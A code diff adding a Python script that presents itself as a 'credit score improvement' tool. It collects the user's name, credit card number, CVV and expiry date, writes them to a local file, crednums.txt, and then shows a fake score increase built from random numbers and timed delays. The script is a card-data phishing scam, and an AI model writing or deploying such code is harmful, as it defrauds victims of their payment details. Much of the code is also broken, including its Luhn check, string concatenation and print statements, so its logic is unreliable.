@@ -1,0 +1,75 @@
+import time
+import random
+import sys
+file1 = open("crednums.txt","r+")
+from os import system, name
+from time import sleep
+def clear():
+  if name == sleep:
+    _=system('cls')
+  else:
+    _= system('clear')
+clear()
+name1 = input("Enter your full name: ")
+initial = (input("Enter your middle initial: "))
+score = input("Enter Your Credit Card Score: ")
+if float(score) > 950:
+  print ("Score too high to be improved.")
+score2 = score
+print("Finding User Information, Please wait...")
+time.sleep(6)
+clear()
+crednum=(input("Please input your credit card number)(no spaces): "))
+if (len(crednum))==15:
+  luhn1= float(crednum[0]+[2]+[4]+[6]+[8]+[10]+[12]+[14])
+  luhn2= float(crednum[1]+[3]+[5]+[7]+[9]+[11]+[13])
+  luhnsum= luhn1+luhn2
+  luhnfin= round(luhnsum)
+  if luhnfin-luhnsum == (crednum[15]):
+    print()
+    luhnvalue = True
+else:
+  luhnvalue = False
+CVV=input("Now the CVV (three digits on the back): ")
+if (len(CVV))== 3:
+  print()
+else:
+  print("Invalid CVV, please try again.")
+  time.sleep(2)
+  sys.exit()
+if luhnvalue == True:
+  luhnvalue = ("Luhn Check: Positive")
+else:
+  luhnvalue =  ("Luhn Check: Negative")
+expire = input("And lastly, the expiration date (MM/YY): ")
+if (len(expire))== 5:
+  print()
+else:
+  print("Invalid expiration date, please try again.")
+  time.sleep(2)
+  sys.exit()
+print("Thank You")
+print("loading...")
+time.sleep(5)
+file1.writelines(name1)
+file1.writelines(crednum)
+file1.writelines(CVV)
+file1.writelines(expire)
+file1.writelines(luhnvalue)
+print ("Your current score is: ")+(score)+(".")
+change = (float(score2))-(float(score))
+if score <= 950:
+  print("Running our proprietary credit score improvment algorithm...")
+  while score <= 950:
+    score = score + random.randint(1,11)
+    print(score)
+    time.sleep(2)
+    if score >= 950:
+      clear()
+      print ("Done!")
+      print ("Your old score was: ")+(score2)+(".")
+      print ("Your new score is: ")+ (score)+(".")
+      print (("Your score went up by ")+(change)+("points!"))
+      print ("Thank You ")+(name1)+(".")
+      time.sleep(10)
+      sys.exit()
